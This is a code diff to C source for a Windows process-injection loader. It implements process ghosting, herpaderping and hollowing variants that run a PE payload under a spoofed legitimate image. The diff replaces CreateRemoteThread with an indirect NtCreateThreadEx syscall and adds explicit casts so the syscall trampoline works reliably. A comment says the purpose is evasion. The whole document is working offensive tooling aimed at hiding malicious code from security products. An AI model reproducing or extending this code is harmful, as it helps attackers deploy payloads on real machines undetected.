@@ -300,12 +300,12 @@ static BOOL InitializeProcessParams(IN HANDLE hProcess, IN LPWSTR szImagePath, O
 
     pTmp = (PVOID)base;
     SET_SYSCALL(g_Nt.NtAllocateVirtualMemory);
-    status = RunSyscall(hProcess, &pTmp, 0, &span, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    status = RunSyscall(hProcess, &pTmp, (ULONG_PTR)0, &span, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     if (status != 0)
         goto _done;
 
     SET_SYSCALL(g_Nt.NtWriteVirtualMemory);
-    status = RunSyscall(hProcess, pParams, pParams, pParams->Length, &written);
+    status = RunSyscall(hProcess, pParams, pParams, (SIZE_T)pParams->Length, &written);
     if (status != 0)
         goto _done;
 
@@ -409,16 +409,26 @@ static BOOL OverwriteFileFromFile(IN HANDLE hSrc, IN HANDLE hDst) {
 }
 
 // ------------------------------------------------------------------
-// Thread creation for NtCreateProcessEx-backed processes. Uses
-// CreateRemoteThread rather than the 11-argument indirect NtCreateThreadEx
-// syscall: the variadic RunSyscall path is unreliable under -O2 in large
-// stack frames (intermittent STATUS_NO_MEMORY). The evasion value of these
-// techniques is the ghosted/spoofed image and manual process parameters,
-// not the thread-creation API.
+// Isolated NtCreateThreadEx indirect syscall. All 64-bit parameters are
+// cast explicitly — through the variadic RunSyscall trampoline, a bare int
+// literal leaves the upper 32 bits undefined, which the kernel reads as a
+// garbage StackSize/ZeroBits and intermittently fails with STATUS_NO_MEMORY.
 // ------------------------------------------------------------------
-static NTSTATUS CreateProcessThread(IN HANDLE* phThread, IN HANDLE hProcess, IN PVOID pEntry) {
-    *phThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pEntry, NULL, 0, NULL);
-    return (*phThread != NULL) ? 0 : (NTSTATUS)GetLastError();
+static NTSTATUS SyscallCreateThread(IN HANDLE* phThread, IN HANDLE hProcess, IN PVOID pEntry) {
+    SET_SYSCALL(g_Nt.NtCreateThreadEx);
+    return RunSyscall(
+        phThread,
+        (ACCESS_MASK)THREAD_ALL_ACCESS,
+        NULL,
+        hProcess,
+        pEntry,
+        NULL,
+        (ULONG)FALSE,
+        (SIZE_T)0,      // ZeroBits
+        (SIZE_T)0,      // StackSize
+        (SIZE_T)0,      // MaximumStackSize
+        NULL
+    );
 }
 
 // ==================================================================
@@ -462,7 +472,7 @@ BOOL GhostProcessInject(IN PBYTE pPeBuffer, IN DWORD dwPeSize, IN LPWSTR szLegit
         goto _fail;
     pEntry = (PVOID)((ULONG_PTR)pImageBase + rva);
 
-    status = CreateProcessThread(&hThread, hProcess, pEntry);
+    status = SyscallCreateThread(&hThread, hProcess, pEntry);
     if (status != 0 || !hThread)
         goto _fail;
 
@@ -519,7 +529,7 @@ BOOL GhostlyHollow(IN PBYTE pPeBuffer, IN DWORD dwPeSize, IN LPWSTR szLegitImage
         goto _done;
 
     SET_SYSCALL(g_Nt.NtMapViewOfSection);
-    status = RunSyscall(hSection, pi.hProcess, &pBase, 0, 0, NULL, &viewSize,
+    status = RunSyscall(hSection, pi.hProcess, &pBase, (ULONG_PTR)0, (SIZE_T)0, NULL, &viewSize,
                         ViewUnmap, 0, PAGE_READONLY);
     if (status != 0 || !pBase)
         goto _done;
@@ -617,7 +627,7 @@ BOOL HerpaderpingProcess(IN PBYTE pPeBuffer, IN DWORD dwPeSize, IN LPWSTR szLegi
         goto _done;
     pEntry = (PVOID)((ULONG_PTR)pImageBase + rva);
 
-    status = CreateProcessThread(&hThread, hProcess, pEntry);
+    status = SyscallCreateThread(&hThread, hProcess, pEntry);
     if (status != 0 || !hThread)
         goto _done;
 
@@ -702,7 +712,7 @@ BOOL HerpaderplyHollow(IN PBYTE pPeBuffer, IN DWORD dwPeSize, IN LPWSTR szLegitI
         goto _done;
 
     SET_SYSCALL(g_Nt.NtMapViewOfSection);
-    status = RunSyscall(hSection, pi.hProcess, &pBase, 0, 0, NULL, &viewSize,
+    status = RunSyscall(hSection, pi.hProcess, &pBase, (ULONG_PTR)0, (SIZE_T)0, NULL, &viewSize,
                         ViewShare, 0, PAGE_READONLY);
     if (status != 0 || !pBase)
         goto _done;
